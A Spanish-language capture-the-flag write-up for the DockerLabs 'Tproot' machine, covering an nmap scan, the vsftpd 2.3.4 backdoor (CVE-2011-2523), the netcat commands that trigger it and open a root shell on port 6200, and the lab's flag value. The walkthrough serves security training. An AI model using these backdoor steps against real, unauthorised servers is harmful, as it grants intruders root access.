# 🎯 Tproot - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20F%C3%A1cil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/T%C3%A9cnicas-vsftpd%202.3.4%20Backdoor-red)

## 📌 Resumen

Máquina de nivel **Muy Fácil** de [DockerLabs](https://dockerlabs.es/) que explota
una **puerta trasera en vsftpd 2.3.4** (**CVE-2011-2523**) para obtener acceso
directo como **root**.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `nmap -p-` | 21, 80 |
| Análisis | Banner vsftpd | Versión 2.3.4 vulnerable |
| Explotación | CVE-2011-2523 | Shell como **root** |
| Flag | `/root/root.txt` | ✅ |

> **Nota:** Esta máquina da acceso **directo como root**, sin fase de escalada.
> Es una de las más sencillas de DockerLabs.

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --min-rate 5000 -T4 -v 172.17.0.2
```

**Resultado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21     | FTP      | **vsftpd 2.3.4** |
| 80     | HTTP     | Apache httpd |

### Análisis de la versión

La versión **vsftpd 2.3.4** es conocida por contener una **puerta trasera**
introducida en el código fuente original (CVE-2011-2523). Cuando un cliente
envía un usuario con `:)` al final, el servidor abre un shell en el puerto
**6200/tcp**.

📚 Referencia: [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)

---

## 💥 Explotación

### 1. Activar el backdoor

**Terminal 1** — Conexión al FTP enviando el usuario malicioso:

```bash
nc 172.17.0.2 21
USER user:)
PASS x
```

Al enviar `USER user:)`, el backdoor se activa y el servidor abre una shell
en el puerto **6200**.

### 2. Conectar a la shell

**Terminal 2** — Conexión al shell abierto:

```bash
nc 172.17.0.2 6200
```

Se obtiene una shell directa como **root**:

```bash
whoami
# root
```

---

## 🏁 Flag

```bash
cat /root/root.txt
```

| Flag | Valor |
|------|-------|
| `root.txt` | `261fd3f32200f950f231816b4e9a0594` |

---

## 🧠 Lecciones aprendidas

1. **Identificar versiones exactas** es clave. `vsftpd 2.3.4` tiene un exploit
   famoso de hace más de una década y sigue apareciendo en labs.
2. **CVE-2011-2523** es un backdoor introducido en el código fuente, no un
   bug de programación. Demuestra que la **cadena de suministro** es un vector real.
3. **En esta máquina no hay escalada**: el exploit da root directo. No siempre
   hay que pasar por `sudo -l` o GTFObins.
4. **`nc` (netcat)** es suficiente para explotar este backdoor; no hace falta
   Metasploit ni scripts complejos.
5. **Dos terminales en paralelo** es una técnica útil cuando un exploit abre
   un puerto distinto al que estás usando.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `nc` (netcat)

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [CVE-2011-2523 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [vsftpd 2.3.4 Backdoor - Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2025-09-19
